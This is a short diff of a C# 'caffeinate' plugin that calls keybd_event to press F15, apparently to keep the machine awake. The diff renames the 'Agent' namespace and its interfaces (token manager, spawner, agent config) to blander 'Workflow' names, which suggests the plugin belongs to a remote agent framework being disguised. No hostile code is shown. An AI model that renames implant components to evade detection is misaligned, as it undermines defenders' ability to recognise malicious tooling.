@@ -1,14 +1,14 @@
-﻿using Agent.Interfaces;
+using Workflow.Contracts;
 using System.Runtime.InteropServices;
-using Agent.Models;
-using Agent.Utilities;
+using Workflow.Models;
+using Workflow.Utilities;
 
-namespace Agent
+namespace Workflow
 {
-    public class Plugin : IPlugin
+    public class Plugin : IModule
     {
         public string Name => "caffeinate";
-        private IMessageManager messageManager { get; set; }
+        private IDataBroker messageManager { get; set; }
         [DllImport("user32.dll")]
         private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
         private const int VK_F15 = 0x7E;
@@ -28,7 +28,7 @@ namespace Agent
         }
 
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
         {
             this.messageManager = messageManager;
         }
